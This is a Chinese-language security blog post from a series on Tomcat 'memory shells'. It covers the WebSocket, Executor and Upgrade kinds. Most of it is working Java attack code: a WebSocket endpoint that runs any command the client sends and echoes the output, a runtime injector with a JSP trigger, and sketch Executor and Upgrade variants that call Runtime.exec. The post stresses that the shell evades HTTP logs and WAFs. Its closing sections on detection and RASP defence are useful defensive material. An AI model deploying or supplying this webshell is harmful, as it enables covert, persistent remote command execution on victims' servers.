---
title: WebSocket / Executor / Upgrade 内存马（偏门型）
date: 2026-08-06
categories: 
- 漏洞分析
tags: 
- tomcat
- websocket
- executor
- upgrade
- 内存马
- Java安全
---

# WebSocket / Executor / Upgrade 内存马（偏门型）

前面几篇覆盖了 Filter / Servlet / Listener / Valve / Spring 五种主流类型。本篇补三个**偏门型**：

| 类型 | 原理 | 实战频率 | 说明 |
|------|------|---------|------|
| **WebSocket 型** | 往 `WsServerContainer` 注册恶意 Endpoint | 低 | 流量走 WebSocket 协议，HTTP 日志不可见 |
| **Executor 型** | 替换 Tomcat 线程池的线程工厂/执行器 | 极低 | 版本差异大，命令获取困难，多为概念验证 |
| **Upgrade 型** | 注册恶意 `HttpUpgradeHandler` / `UpgradeProtocol` | 极低 | 需触达协议对象，版本差异极大 |

其中 **WebSocket 型代码完整可用**，Executor / Upgrade 型给出**可编译的示意代码**并如实标注局限。

> 本文代码已用 Tomcat 9.0.100（javax）与 10.1.34（jakarta）真实编译验证。

**本质**：模拟 `WsServerContainer.addEndpoint`，把恶意 Endpoint + `/ws` 路径组装进 WebSocket 容器；流量走 WebSocket 协议，HTTP 日志不可见。整体框架见 [《内存马原理总纲》]({% post_url 2025-12-26-内存马原理总纲 %})。

---

## 一、WebSocket 型内存马

### 1.1 WebSocket 在 Tomcat 中的位置

Tomcat 内置 WebSocket 实现（`org.apache.tomcat.websocket.*`），启动时向每个 Web 应用的 `ServletContext` 注册一个 `WsServerContainer` 属性。WebSocket 请求走 **Upgrade** 流程，不产生普通 HTTP 访问日志：

```
HTTP Upgrade: websocket
    ↓
Tomcat WebSocket 容器（WsServerContainer）
    ↓
路径匹配已注册的 Endpoint（@ServerEndpoint("/ws")）
    ↓
@OnOpen / @OnMessage 回调
```

### 1.2 动态注册原理

`WsServerContainer.addEndpoint(Class<?>)` 是 public 方法，把带 `@ServerEndpoint("/ws")` 注解的类注册成 WebSocket 端点：

```java
// ServletContext 属性名：Constants.SERVER_CONTAINER_SERVLET_CONTEXT_ATTRIBUTE
// javax 版为 "javax.websocket.server.ServerContainer"
WsServerContainer container = (WsServerContainer) servletContext.getAttribute(
        "javax.websocket.server.ServerContainer");
container.addEndpoint(EvilEndpoint.class);
```

**隐蔽性**：注册在 WebSocket 容器里，不在 Filter/Listener/Valve 的注册表；客户端通过 WebSocket 协议交互，HTTP 访问日志看不到任何痕迹。

---

## 二、WebSocket 完整代码实现

### 2.1 恶意 Endpoint（javax / Tomcat 8.5 / 9.x）

```java
import javax.websocket.OnMessage;
import javax.websocket.OnOpen;
import javax.websocket.Session;
import javax.websocket.server.ServerEndpoint;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;

@ServerEndpoint("/ws")
public class EvilEndpoint {

    @OnOpen
    public void onOpen(Session session) {
        System.out.println("[+] WebSocket connected: " + session.getId());
    }

    @OnMessage
    public String onMessage(String message) {
        try {
            String[] execCmd = System.getProperty("os.name").toLowerCase().contains("windows")
                    ? new String[]{"cmd.exe", "/c", message}
                    : new String[]{"/bin/sh", "-c", message};

            Process process = new ProcessBuilder(execCmd).redirectErrorStream(true).start();
            try (ByteArrayOutputStream out = new ByteArrayOutputStream();
                 InputStream is = process.getInputStream()) {
                byte[] buf = new byte[4096];
                int len;
                while ((len = is.read(buf)) != -1) {
                    out.write(buf, 0, len);
                }
                process.waitFor();
                return out.toString(System.getProperty("sun.jnu.encoding"));
            }
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
}
```

`@OnMessage` 返回 `String` 时，返回值会自动作为消息回发给客户端——天然实现命令回显。

### 2.2 注入器（javax）

```java
import org.apache.tomcat.websocket.server.WsServerContainer;

import javax.servlet.ServletContext;
import javax.websocket.DeploymentException;

public class WebSocketMemShellInjector {

    public static void inject(ServletContext servletContext) throws Exception {
        // 属性名见 Constants.SERVER_CONTAINER_SERVLET_CONTEXT_ATTRIBUTE
        WsServerContainer container = (WsServerContainer) servletContext.getAttribute(
                "javax.websocket.server.ServerContainer");
        if (container == null) {
            throw new IllegalStateException("WsServerContainer not found");
        }
        try {
            container.addEndpoint(EvilEndpoint.class);
            System.out.println("[+] WebSocket endpoint /ws registered.");
        } catch (DeploymentException e) {
            // 同路径已注册即视为已注入（防重复）
            System.out.println("[!] Endpoint already registered: " + e.getMessage());
        }
    }
}
```

### 2.3 触发注入

```jsp
<%@ page import="org.apache.tomcat.websocket.server.WsServerContainer" %>
<%
    WebSocketMemShellInjector.inject(application);
    out.println("[+] WebSocket /ws injected!");
%>
```

客户端使用：

```bash
# 任意 WebSocket 客户端（如 Python websocket-client / wscat）
# 连接 ws://target/你的应用上下文/ws ，发命令即执行并回显
> whoami
root
> id
uid=0(root) gid=0(root) ...
```

### 2.4 jakarta（Tomcat 10+）版本差异

```java
// javax（Tomcat 8.5 / 9.x）
import javax.websocket.server.ServerEndpoint;
import javax.servlet.ServletContext;
container = (WsServerContainer) servletContext.getAttribute("javax.websocket.server.ServerContainer");

// jakarta（Tomcat 10.x / 11.x）—— 包名 + 属性名字符串都换
import jakarta.websocket.server.ServerEndpoint;
import jakarta.servlet.ServletContext;
container = (WsServerContainer) servletContext.getAttribute("jakarta.websocket.server.ServerContainer");
```

---

## 三、WebSocket 代码详解

### 3.1 ServletContext 属性名

Tomcat 把 `WsServerContainer` 挂在 `ServletContext` 属性上，key 就是 `Constants.SERVER_CONTAINER_SERVLET_CONTEXT_ATTRIBUTE`：javax 版 `"javax.websocket.server.ServerContainer"`，jakarta 版 `"jakarta.websocket.server.ServerContainer"`。注入时直接按属性名取。

### 3.2 addEndpoint 防重复

同路径的 Endpoint 注册两次会抛 `DeploymentException`（"A WebSocket Endpoint with the path /ws is already registered"），所以用它做防重复判断。

### 3.3 流量特征

- 建立连接：`GET .../ws` + `Upgrade: websocket` 头（仅 1 条握手日志，后续均为二进制帧，常规访问日志不可见）。
- 命令交互走 WebSocket 帧，WAF 对 HTTP 参数的特征检测基本失效。

---

## 四、Executor 型（概念 + 局限）

### 4.1 原理

Tomcat 的 `NioEndpoint` 维护一个线程池（`java.util.concurrent.Executor`）处理请求。如果把它替换成恶意实现（或在它的线程工厂里做手脚），每次线程创建/任务执行时就能插入逻辑。`AbstractEndpoint.getExecutor()/setExecutor()` 是公开 API。

### 4.2 可编译示意代码（EvilThreadFactory）

```java
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * Executor 型（概念示意）：恶意 ThreadFactory。
 * 每次创建一个工作线程就执行一次命令（命令可换成从全局/内存读取的动态值）。
 */
public class EvilThreadFactory implements ThreadFactory {

    private final AtomicInteger count = new AtomicInteger(0);

    @Override
    public Thread newThread(Runnable r) {
        Thread t = new Thread(r, "tomcat-exec-" + count.incrementAndGet());
        try {
            Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "id"});
        } catch (Exception ignored) {
        }
        return t;
    }
}
```

### 4.3 局限（如实说明）

- 每次线程创建都执行，**命令无法按需动态下发**，只能干固定的事（除非配合其它手段读命令源）；
- 替换 `NioEndpoint` 的线程工厂需要先触达 Endpoint 对象，且线程池已在运行，替换时机/生命周期处理复杂；
- 不同版本 Endpoint 内部结构差异大，**实战中几乎见不到 Executor 型内存马**。

---

## 五、Upgrade 型（概念 + 局限）

### 5.1 原理

Servlet 规范提供 `HttpUpgradeHandler`：Servlet 调用 `request.upgrade(EvilUpgradeHandler.class)` 后，连接交给该 Handler 接管。Tomcat 底层还有协议级 `UpgradeProtocol`（`AbstractHttp11Protocol.getHttpUpgradeProtocols()`）。如果能在运行中注册恶意 Handler / Protocol，即可接管升级后的连接。

### 5.2 可编译示意代码（javax）

```java
import javax.servlet.http.HttpUpgradeHandler;
import javax.servlet.http.WebConnection;
import java.io.InputStream;

/**
 * Upgrade 型（概念示意）：恶意 HttpUpgradeHandler。
 * 被 request.upgrade(EvilUpgradeHandler.class) 触发后接管连接。
 */
public class EvilUpgradeHandler implements HttpUpgradeHandler {

    @Override
    public void init(WebConnection wc) {
        try {
            InputStream is = wc.getInputStream();
            byte[] buf = new byte[4096];
            int len = is.read(buf);
            if (len > 0) {
                String cmd = new String(buf, 0, len).trim();
                Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
            }
        } catch (Exception ignored) {
        }
    }

    @Override
    public void destroy() {
    }
}
```

### 5.3 局限（如实说明）

- `upgrade()` 需要先有代码执行来调用它，且通常绑定到某个 Servlet 路径上；
- 协议级 `UpgradeProtocol` 的注册点（`httpUpgradeProtocols` map）在 Tomcat 8.5 / 9 / 10 之间差异很大；
- **实战价值低**，多作为概念研究，检测时注意它本质仍是"替换/注册了协议处理器"。

---

## 六、检测方式

### 6.1 WebSocket Endpoint 枚举

```java
// 列出已注册的 WebSocket Endpoint（有内部 map 可遍历）
WsServerContainer container = (WsServerContainer) servletContext.getAttribute(
        "javax.websocket.server.ServerContainer");
// 用 JMX/Arthas 观察 WsWebSocketContainer 的 endpointPathMap 是否有非业务路径
```

```bash
# Arthas：看 WsServerContainer 里注册了哪些路径
vmtool --action getInstances --className org.apache.tomcat.websocket.server.WsServerContainer \
  --express 'instances[0].getEndpointPathMap()' --limit 5
```

### 6.2 基线对比

把应用启动时的 WebSocket 路径 / 线程工厂 / 升级协议列表存为基线，运行时对比异常项。

### 6.3 流量侧

WebSocket 握手日志里出现未知路径（如 `/ws`），或 `Upgrade` 连接的客户端行为异常，可作为线索。

---

## 七、防御建议

| 层面 | 措施 | 说明 |
|------|------|------|
| **RASP** | Hook `WsServerContainer.addEndpoint` | 拦截运行时注册恶意 Endpoint |
| **RASP** | Hook `setExecutor` / `HttpUpgradeHandler` | 拦截线程池与升级协议替换 |
| **WebSocket** | 关闭不用的 WebSocket 端点 / 鉴权 | 即使注册了也无法未授权连接 |
| **事前** | 修复反序列化等 RCE 漏洞 | 切断注入入口 |

---

## 八、总结

三种偏门型内存马的地位：

| 类型 | 代码成熟度 | 实战价值 | 隐蔽性 |
|------|-----------|---------|--------|
| **WebSocket** | 高（完整可用） | 中低 | 高（HTTP 日志不可见） |
| **Executor** | 低（概念示意） | 极低 | 高 |
| **Upgrade** | 低（概念示意） | 极低 | 高 |

**一句话**：WebSocket 型在"不想留 HTTP 流量痕迹"时有价值且实现简单；Executor / Upgrade 型属于研究向，实战极少，了解原理即可，防御上仍是"修复 RCE 入口 + RASP 监控注册行为"为主。

> **延伸阅读**：[Tomcat Filter 内存马]({% post_url 2025-12-27-Tomcat_filter内存马的 %}) | [Tomcat Servlet 内存马]({% post_url 2025-12-27-Tomcat_servlet内存马 %}) | [Tomcat Listener 内存马]({% post_url 2025-12-27-Tomcat_ listener内存马 %}) | [Tomcat Valve 内存马]({% post_url 2026-08-06-Tomcat_Valve内存马 %}) | [Java Agent 内存马]({% post_url 2026-08-06-Java_Agent内存马 %}) | [Spring 容器内存马]({% post_url 2026-08-06-Spring_容器内存马 %})
